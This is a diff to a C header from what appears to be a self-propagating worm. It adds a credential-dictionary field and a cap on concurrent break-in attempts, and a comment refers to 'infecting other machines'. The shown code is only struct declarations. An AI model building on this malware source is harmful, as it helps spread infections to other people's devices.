@@ -1,7 +1,7 @@
 #pragma once
 #include "pack.h"
 #include "resolv.h"
-#include "htbt.h"
+#include "cred_dict.h"
 
 #include <stdint.h>
 #include <stdbool.h>
@@ -14,6 +14,8 @@
 #include <mbedtls/ctr_drbg.h>
 
 
+#define PROONE_BNE_MAX_CNT	128
+
 struct prne_global { // TODO: tidy init code when finalised
 	struct timespec parent_start;
 	struct timespec child_start;
@@ -24,12 +26,12 @@ struct prne_global { // TODO: tidy init code when finalised
 	* Could be NULL. Just keep infecting other machines without it.
 	*/
 	prne_resolv_t *resolv;
-	prne_htbt_t *htbt;
 	pid_t parent_pid;
 	pid_t child_pid;
 	uint8_t *m_dvault;
 	const uint8_t *m_exec;
 	size_t exec_size;
+	size_t self_size;
 	const uint8_t *m_exec_dvault;
 	int blackhole[2];
 	int shm_fd;
@@ -37,6 +39,7 @@ struct prne_global { // TODO: tidy init code when finalised
 	bool is_child;
 
 	prne_bin_archive_t bin_archive;
+	prne_cred_dict_t cred_dict;
 
 	struct {
 		mbedtls_x509_crt ca;
